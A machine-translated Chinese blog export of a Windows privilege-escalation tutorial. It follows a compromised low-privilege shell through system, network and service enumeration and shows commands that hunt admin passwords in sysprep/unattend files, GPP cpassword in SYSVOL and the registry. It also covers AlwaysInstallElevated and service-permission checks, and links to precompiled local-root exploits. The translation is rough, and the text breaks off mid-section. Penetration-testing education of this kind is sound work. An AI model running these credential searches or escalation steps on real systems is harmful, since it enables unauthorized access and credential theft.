http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com 查找有关该漏洞利用的更多信息http://www.cvedetails.com http://packetstormsecurity.org/files/cve/[CVE] http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE] http://www.vulnview.com/cve-details.php?cvename=[CVE] （快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/ http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/ 缓解措施上述任何信息都很容易找到吗？试试吧！设置一个自动执行脚本和/或第三方产品的cron作业 系统是否完全打补丁？内核，操作系统，所有应用程序，插件和Web服务 apt-get update &amp;&amp; apt-get upgrade yum update 服务是否以最低权限级别运行？例如，您是否需要以root身份运行MySQL？ 脚本任何一个都可以自动化吗？！http://pentestmonkey.net/tools/unix-privesc-check/ http://labs.portcullis.co.uk/application/enum4linux/ http://bastille-linux.sourceforge.net","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Windows权限提升基础","slug":"Windows权限提升基础","date":"2019-03-18T05:29:26.000Z","updated":"2019-03-18T06:09:23.282Z","comments":true,"path":"2019/03/Windows权限提升基础/","link":"","permalink":"/2019/03/Windows权限提升基础/","excerpt":"","text":"原文链接：http://www.fuzzysecurity.com/tutorials/16.html Windows权限提升基础没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer … 与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。 应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。 最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。 不可或缺的资源：Windows Privilege Escalation百科全书（Brett Moore） - 这里。Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） - 这里。通过利用弱文件夹权限提升权限（Parvez Anwar） - 这里。 Δt for t0 to t3 - 初始信息收集 本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。 最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。 首先让我们找出我们连接的操作系统： C:\\Windows\\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。 C:\\Windows\\system32&gt; hostname b33f C:\\Windows\\system32&gt; echo %username% user1 现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。 C:\\Windows\\system32&gt; net users User accounts for \\\\B33F ------------------------------------------------------------------------------- Administrator b33f Guest user1 The command completed successfully. C:\\Windows\\system32&gt; net user user1 User name user1 Full Name Comment User&#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 1/11/2014 7:47:14 PM Password expires Never Password changeable 1/11/2014 7:47:14 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 1/11/2014 8:05:09 PM Logon hours allowed All Local Group Memberships *Users Global Group memberships *None The command completed successfully. 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。 首先让我们看一下可用的网络接口和路由表。 C:\\Windows\\system32&gt; ipconfig /all Windows IP Configuration Host Name . . . . . . . . . . . . : b33f Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No Ethernet adapter Bluetooth Network Connection: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network) Physical Address. . . . . . . . . : 0C-84-DC-62-60-29 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection Physical Address. . . . . . . . . : 00-0C-29-56-79-35 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred) IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM Default Gateway . . . . . . . . . : 192.168.0.1 DHCP Server . . . . . . . . . . . : 192.168.0.1 DHCPv6 IAID . . . . . . . . . . . : 234884137 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35 DNS Servers . . . . . . . . . . . : 192.168.0.1 NetBIOS over Tcpip. . . . . . . . : Enabled C:\\Windows\\system32&gt; route print =========================================================================== Interface List 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network) 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection 1...........................Software Loopback Interface 1 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface =========================================================================== IPv4 Route Table =========================================================================== Active Routes: Network Destination Netmask Gateway Interface Metric 0.0.0.0 0.0.0.0 192.168.0.1 192.168.0.104 10 127.0.0.0 255.0.0.0 On-link 127.0.0.1 306 127.0.0.1 255.255.255.255 On-link 127.0.0.1 306 127.255.255.255 255.255.255.255 On-link 127.0.0.1 306 192.168.0.0 255.255.255.0 On-link 192.168.0.104 266 192.168.0.104 255.255.255.255 On-link 192.168.0.104 266 192.168.0.255 255.255.255.255 On-link 192.168.0.104 266 224.0.0.0 240.0.0.0 On-link 127.0.0.1 306 224.0.0.0 240.0.0.0 On-link 192.168.0.104 266 255.255.255.255 255.255.255.255 On-link 127.0.0.1 306 255.255.255.255 255.255.255.255 On-link 192.168.0.104 266 =========================================================================== Persistent Routes: None IPv6 Route Table =========================================================================== Active Routes: If Metric Network Destination Gateway 14 58 ::/0 On-link 1 306 ::1/128 On-link 14 58 2001::/32 On-link 14 306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128 On-link 11 266 fe80::/64 On-link 14 306 fe80::/64 On-link 14 306 fe80::8d2:b4e:3f57:ff97/128 On-link 11 266 fe80::5cd4:9caf:61c0:ba6e/128 On-link 1 306 ff00::/8 On-link 14 306 ff00::/8 On-link 11 266 ff00::/8 On-link =========================================================================== Persistent Routes: None # arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces. C:\\Windows\\system32&gt; arp -A Interface: 192.168.0.104 --- 0xb Internet Address Physical Address Type 192.168.0.1 90-94-e4-c5-b0-46 dynamic 192.168.0.101 ac-22-0b-af-bb-43 dynamic 192.168.0.255 ff-ff-ff-ff-ff-ff static 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.251 01-00-5e-00-00-fb static 224.0.0.252 01-00-5e-00-00-fc static 239.255.255.250 01-00-5e-7f-ff-fa static 255.255.255.255 ff-ff-ff-ff-ff-ff static 这将我们带到活动网络连接和防火墙规则。 C:\\Windows\\system32&gt; netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 684 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:5354 0.0.0.0:0 LISTENING 1400 TCP 192.168.0.104:139 0.0.0.0:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 684 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:5357 [::]:0 LISTENING 4 UDP 0.0.0.0:5355 *:* 1100 UDP 0.0.0.0:52282 *:* 976 UDP 0.0.0.0:55202 *:* 2956 UDP 0.0.0.0:59797 *:* 1400 UDP 127.0.0.1:1900 *:* 2956 UDP 127.0.0.1:65435 *:* 2956 UDP 192.168.0.104:137 *:* 4 UDP 192.168.0.104:138 *:* 4 UDP 192.168.0.104:1900 *:* 2956 UDP 192.168.0.104:5353 *:* 1400 UDP 192.168.0.104:65434 *:* 2956 UDP [::]:5355 *:* 1100 UDP [::]:52281 *:* 976 UDP [::]:52283 *:* 976 UDP [::]:55203 *:* 2956 UDP [::]:59798 *:* 1400 UDP [::1]:1900 *:* 2956 UDP [::1]:5353 *:* 1400 UDP [::1]:65433 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:1900 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:65432 *:* 2956 # The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh firewall commands are only available from XP SP2 and upwards. C:\\Windows\\system32&gt; netsh firewall show state Firewall status: ------------------------------------------------------------------- Profile = Standard Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Group policy version = Windows Firewall Remote admin mode = Disable Ports currently open on all network interfaces: Port Protocol Version Program ------------------------------------------------------------------- No ports are currently open on all network interfaces. C:\\Windows\\system32&gt; netsh firewall show config Domain profile configuration: ------------------------------------------------------------------- Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Allowed programs configuration for Domain profile: Mode Traffic direction Name / Program ------------------------------------------------------------------- Port configuration for Domain profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Domain profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Standard profile configuration (current): ------------------------------------------------------------------- Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Service configuration for Standard profile: Mode Customized Name ------------------------------------------------------------------- Enable No Network Discovery Allowed programs configuration for Standard profile: Mode Traffic direction Name / Program ------------------------------------------------------------------- Enable Inbound COMRaider / E:\\comraider\\comraider.exe Enable Inbound nc.exe / C:\\users\\b33f\\desktop\\nc.exe Port configuration for Standard profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Standard profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Log configuration: ------------------------------------------------------------------- File location = C:\\Windows\\system32\\LogFiles\\Firewall\\pfirewall.log Max file size = 4096 KB Dropped packets = Disable Connections = Disable 最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。 # This will display verbose output for all scheduled tasks, below you can see sample output for a single task. C:\\Windows\\system32&gt; schtasks /query /fo LIST /v Folder: \\Microsoft\\Windows Defender HostName: B33F TaskName: \\Microsoft\\Windows Defender\\MP Scheduled Scan Next Run Time: 1/22/2014 5:11:13 AM Status: Ready Logon Mode: Interactive/Background Last Run Time: N/A Last Result: 1 Author: N/A Task To Run: c:\\program files\\windows defender\\MpCmdRun.exe Scan -ScheduleJob -WinTask -RestrictPrivilegesScan Start In: N/A Comment: Scheduled Scan Scheduled Task State: Enabled Idle Time: Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes Power Management: No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Enabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: Daily Start Time: 5:11:13 AM Start Date: 1/1/2000 End Date: 1/1/2100 Days: Every 1 day(s) Months: N/A Repeat: Every: Disabled Repeat: Until: Time: Disabled Repeat: Until: Duration: Disabled Repeat: Stop If Still Running: Disabled [..Snip..] # The following command links running processes to started services. C:\\Windows\\system32&gt; tasklist /SVC Image Name PID Services ========================= ======== ============================================ System Idle Process 0 N/A System 4 N/A smss.exe 244 N/A csrss.exe 332 N/A csrss.exe 372 N/A wininit.exe 380 N/A winlogon.exe 428 N/A services.exe 476 N/A lsass.exe 484 SamSs lsm.exe 496 N/A svchost.exe 588 DcomLaunch, PlugPlay, Power svchost.exe 668 RpcEptMapper, RpcSs svchost.exe 760 Audiosrv, Dhcp, eventlog, HomeGroupProvider, lmhosts, wscsvc svchost.exe 800 AudioEndpointBuilder, CscService, Netman, SysMain, TrkWks, UxSms, WdiSystemHost, wudfsvc svchost.exe 836 AeLookupSvc, BITS, gpsvc, iphlpsvc, LanmanServer, MMCSS, ProfSvc, Schedule, seclogon, SENS, ShellHWDetection, Themes, Winmgmt, wuauserv audiodg.exe 916 N/A svchost.exe 992 EventSystem, fdPHost, netprofm, nsi, WdiServiceHost, WinHttpAutoProxySvc svchost.exe 1104 CryptSvc, Dnscache, LanmanWorkstation, NlaSvc spoolsv.exe 1244 Spooler svchost.exe 1272 BFE, DPS, MpsSvc mDNSResponder.exe 1400 Bonjour Service taskhost.exe 1504 N/A taskeng.exe 1556 N/A vmtoolsd.exe 1580 VMTools dwm.exe 1660 N/A explorer.exe 1668 N/A vmware-usbarbitrator.exe 1768 VMUSBArbService TPAutoConnSvc.exe 1712 TPAutoConnSvc [..Snip..] C:\\Windows\\system32&gt; net start These Windows services are started: Application Experience Application Information Background Intelligent Transfer Service Base Filtering Engine Bluetooth Support Service Bonjour Service COM+ Event System COM+ System Application Cryptographic Services DCOM Server Process Launcher Desktop Window Manager Session Manager DHCP Client Diagnostic Policy Service Diagnostic Service Host Diagnostic System Host Distributed Link Tracking Client Distributed Transaction Coordinator DNS Client Function Discovery Provider Host Function Discovery Resource Publication Group Policy Client [..Snip..] # This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise. C:\\Windows\\system32&gt; DRIVERQUERY Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 11/20/2010 6:01:11 PM ACPI Microsoft ACPI Driver Kernel 11/20/2010 4:37:52 PM AcpiPmi ACPI Power Meter Drive Kernel 11/20/2010 4:47:55 PM adp94xx adp94xx Kernel 12/6/2008 7:59:55 AM adpahci adpahci Kernel 5/2/2007 1:29:26 AM adpu320 adpu320 Kernel 2/28/2007 8:03:08 AM AFD Ancillary Function Dri Kernel 11/20/2010 4:40:00 PM agp440 Intel AGP Bus Filter Kernel 7/14/2009 7:25:36 AM aic78xx aic78xx Kernel 4/12/2006 8:20:11 AM aliide aliide Kernel 7/14/2009 7:11:17 AM amdagp AMD AGP Bus Filter Dri Kernel 7/14/2009 7:25:36 AM amdide amdide Kernel 7/14/2009 7:11:19 AM AmdK8 AMD K8 Processor Drive Kernel 7/14/2009 7:11:03 AM AmdPPM AMD Processor Driver Kernel 7/14/2009 7:11:03 AM amdsata amdsata Kernel 3/19/2010 9:08:27 AM amdsbs amdsbs Kernel 3/21/2009 2:35:26 AM amdxata amdxata Kernel 3/20/2010 12:19:01 AM AppID AppID Driver Kernel 11/20/2010 5:29:48 PM arc arc Kernel 5/25/2007 5:31:06 AM [..Snip..] Δt for t4 - WMIC的奥术艺术 我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。 完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。 我在下面列出了两个非常值得阅读的资源：Command-Line Ninjitsu（SynJunkie） - 这里是Windows WMIC命令行（ComputerHope） - 这里 不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。 为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。 C:\\Windows\\system32&gt; wmic /? [global switches] The following global switches are available: /NAMESPACE Path for the namespace the alias operate against. /ROLE Path for the role containing the alias definitions. /NODE Servers the alias will operate against. /IMPLEVEL Client impersonation level. /AUTHLEVEL Client authentication level. /LOCALE Language id the client should use. /PRIVILEGES Enable or disable all privileges. /TRACE Outputs debugging information to stderr. /RECORD Logs all input commands and output. /INTERACTIVE Sets or resets the interactive mode. /FAILFAST Sets or resets the FailFast mode. /USER User to be used during the session. /PASSWORD Password to be used for session login. /OUTPUT Specifies the mode for output redirection. /APPEND Specifies the mode for output redirection. /AGGREGATE Sets or resets aggregate mode. /AUTHORITY Specifies the for the connection. /?[:&lt;BRIEF|FULL&gt;] Usage information. For more information on a specific global switch, type: switch-name /? The following alias/es are available in the current role: ALIAS - Access to the aliases available on the local system BASEBOARD - Base board (also known as a motherboard or system board) management. BIOS - Basic input/output services (BIOS) management. BOOTCONFIG - Boot configuration management. CDROM - CD-ROM management. COMPUTERSYSTEM - Computer system management. CPU - CPU management. CSPRODUCT - Computer system product information from SMBIOS. DATAFILE - DataFile Management. DCOMAPP - DCOM Application management. DESKTOP - User&#39;s Desktop management. DESKTOPMONITOR - Desktop Monitor management. DEVICEMEMORYADDRESS - Device memory addresses management. DISKDRIVE - Physical disk drive management. DISKQUOTA - Disk space usage for NTFS volumes. DMACHANNEL - Direct memory access (DMA) channel management. ENVIRONMENT - System environment settings management. FSDIR - Filesystem directory entry management. GROUP - Group account management. IDECONTROLLER - IDE Controller management. IRQ - Interrupt request line (IRQ) management. JOB - Provides access to the jobs scheduled using the schedule service. LOADORDER - Management of system services that define execution dependencies. LOGICALDISK - Local storage device management. LOGON - LOGON Sessions. MEMCACHE - Cache memory management. MEMORYCHIP - Memory chip information. MEMPHYSICAL - Computer system&#39;s physical memory management. NETCLIENT - Network Client management. NETLOGIN - Network login information (of a particular user) management. NETPROTOCOL - Protocols (and their network characteristics) management. NETUSE - Active network connection management. NIC - Network Interface Controller (NIC) management. NICCONFIG - Network adapter management. NTDOMAIN - NT Domain management. NTEVENT - Entries in the NT Event Log. NTEVENTLOG - NT eventlog file management. ONBOARDDEVICE - Management of common adapter devices built into the motherboard (system board). OS - Installed Operating System/s management. PAGEFILE - Virtual memory file swapping management. PAGEFILESET - Page file settings management. PARTITION - Management of partitioned areas of a physical disk. PORT - I/O port management. PORTCONNECTOR - Physical connection ports management. PRINTER - Printer device management. PRINTERCONFIG - Printer device configuration management. PRINTJOB - Print job management. PROCESS - Process management. PRODUCT - Installation package task management. QFE - Quick Fix Engineering. QUOTASETTING - Setting information for disk quotas on a volume. RDACCOUNT - Remote Desktop connection permission management. RDNIC - Remote Desktop connection management on a specific network adapter. RDPERMISSIONS - Permissions to a specific Remote Desktop connection. RDTOGGLE - Turning Remote Desktop listener on or off remotely. RECOVEROS - Information that will be gathered from memory when the operating system fails. REGISTRY - Computer system registry management. SCSICONTROLLER - SCSI Controller management. SERVER - Server information management. SERVICE - Service application management. SHADOWCOPY - Shadow copy management. SHADOWSTORAGE - Shadow copy storage area management. SHARE - Shared resource management. SOFTWAREELEMENT - Management of the elements of a software product installed on a system. SOFTWAREFEATURE - Management of software product subsets of SoftwareElement. SOUNDDEV - Sound Device management. STARTUP - Management of commands that run automatically when users log onto the computer system. SYSACCOUNT - System account management. SYSDRIVER - Management of the system driver for a base service. SYSTEMENCLOSURE - Physical system enclosure management. SYSTEMSLOT - Management of physical connection points including ports, slots and peripherals, and proprietary connections points. TAPEDRIVE - Tape drive management. TEMPERATURE - Data management of a temperature sensor (electronic thermometer). TIMEZONE - Time zone data management. UPS - Uninterruptible power supply (UPS) management. USERACCOUNT - User account management. VOLTAGE - Voltage sensor (electronic voltmeter) data management. VOLUME - Local storage volume management. VOLUMEQUOTASETTING - Associates the disk quota setting with a specific disk volume. VOLUMEUSERQUOTA - Per user storage volume quota management. WMISET - WMI service operational parameters management. For more information on a specific alias, type: alias /? CLASS - Escapes to full WMI schema. PATH - Escapes to full WMI object paths. CONTEXT - Displays the state of all the global switches. QUIT/EXIT - Exits the program. For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /? 为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。 如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。 你可以在这里下载我的脚本（wmic_info.bat）Windows 7 VM上的示例输出文件（严重修补） - 此处 Δt for t5 to t6 - 快速失败 在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。 我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。 C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn Caption Description HotFixID InstalledOn http://support.microsoft.com/?kbid=2727528 Security Update KB2727528 11/23/2013 http://support.microsoft.com/?kbid=2729462 Security Update KB2729462 11/26/2013 http://support.microsoft.com/?kbid=2736693 Security Update KB2736693 11/26/2013 http://support.microsoft.com/?kbid=2737084 Security Update KB2737084 11/23/2013 http://support.microsoft.com/?kbid=2742614 Security Update KB2742614 11/23/2013 http://support.microsoft.com/?kbid=2742616 Security Update KB2742616 11/26/2013 http://support.microsoft.com/?kbid=2750149 Update KB2750149 11/23/2013 http://support.microsoft.com/?kbid=2756872 Update KB2756872 11/24/2013 http://support.microsoft.com/?kbid=2756923 Security Update KB2756923 11/26/2013 http://support.microsoft.com/?kbid=2757638 Security Update KB2757638 11/23/2013 http://support.microsoft.com/?kbid=2758246 Update KB2758246 11/24/2013 http://support.microsoft.com/?kbid=2761094 Update KB2761094 11/24/2013 http://support.microsoft.com/?kbid=2764870 Update KB2764870 11/24/2013 http://support.microsoft.com/?kbid=2768703 Update KB2768703 11/23/2013 http://support.microsoft.com/?kbid=2769034 Update KB2769034 11/23/2013 http://support.microsoft.com/?kbid=2769165 Update KB2769165 11/23/2013 http://support.microsoft.com/?kbid=2769166 Update KB2769166 11/26/2013 http://support.microsoft.com/?kbid=2770660 Security Update KB2770660 11/23/2013 http://support.microsoft.com/?kbid=2770917 Update KB2770917 11/24/2013 http://support.microsoft.com/?kbid=2771821 Update KB2771821 11/24/2013 [..Snip..] 与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。 您可以在下面看到grep补丁的语法： C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; 接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。 通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）： c:\\sysprep.inf c:\\sysprep\\sysprep.xml ％WINDIR％\\Panther\\Unattend\\Unattended.xml ％WINDIR％\\Panther\\Unattended.xml 这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。 `# This is a sample from sysprep.inf with clear-text credentials. This is a sample from sysprep.inf with clear-text credentials.[GuiUnattended]OEMSkipRegional=1OemSkipWelcome=1AdminPassword=s3cr3tp4ssw0rdTimeZone=20 This is a sample from sysprep.xml with Base64 “encoded” credentials. Please people Base64 is notencryption, I take more precautions to protect my coffee. The password here is “SuperSecurePassword”. U3VwZXJTZWN1cmVQYXNzd29yZA== false Local Administrator Administrator Administrators Administrator Sample from Unattended.xml with the same “secure” Base64 encoding. U3VwZXJTZWN1cmVQYXNzd29yZA== false true Administrator 根据Ben Campbell（[@Meatballs__](https://twitter.com/Meatballs__)）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。 除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性： Services \\ Services.xml：[特定于元素的属性](http://msdn.microsoft.com/en-us/library/cc980070.aspx) ScheduledTasks \\ ScheduledTasks.xml：[任务内部元素](http://msdn.microsoft.com/en-us/library/cc422920.aspx)，[TaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd341350.aspx)，[ImmediateTaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd304114.aspx) 打印机\\ Printers.xml：[SharedPrinter元素](http://msdn.microsoft.com/en-us/library/cc422918.aspx) 驱动器\\ Drives.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc704598.aspx) DataSources \\ DataSources.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc422926.aspx) 可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv06_big.png) 然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过[此处](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)建立的会话执行[，](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)或者（2）您可以使用Get-GPPPassword，它是[PowerSploit的](https://github.com/mattifestation/PowerSploit)一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。 接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \\ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在[这里查看](http://www.greyhathacker.net/?p=185)来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。 为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。 This will only work if both registry keys contain “AlwaysInstallElevated” with DWORD values of 1.C:\\Windows\\system32&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevatedC:\\Windows\\system32&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated 为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。 The command below will search the file system for file names containing certain keywords. You canspecify as many keywords as you wish. C:\\Windows\\system32&gt; dir /s pass == cred == vnc == .config Search certain file types for a keyword, this can generate a lot of output.C:\\Windows\\system32&gt; findstr /si password .xml .ini *.txt Similarly the two commands below can be used to grep the registry for keywords, in this case “password”.C:\\Windows\\system32&gt; reg query HKLM /f password /t REG_SZ /sC:\\Windows\\system32&gt; reg query HKCU /f password /t REG_SZ /s ## Δt for t7 to t10 - 卷起你的袖子 希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。 我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在[此处](http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx)从Microsoft technet下载该套件。 我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子 We can use sc to query, configure and manage windows services.C:\\Windows\\system32&gt; sc qc Spooler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Spooler TYPE : 110 WIN32_OWN_PROCESS (interactive) START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\System32\\spoolsv.exe LOAD_ORDER_GROUP : SpoolerGroup TAG : 0 DISPLAY_NAME : Print Spooler DEPENDENCIES : RPCSS : http SERVICE_START_NAME : LocalSystem 我们可以使用accesschk检查每个服务所需的权限级别。 We can see the permissions that each user level has, you can also use “accesschk.exe -ucqv *” to listall services. C:> accesschk.exe -ucqv Spooler Spooler R NT AUTHORITY\\Authenticated Users 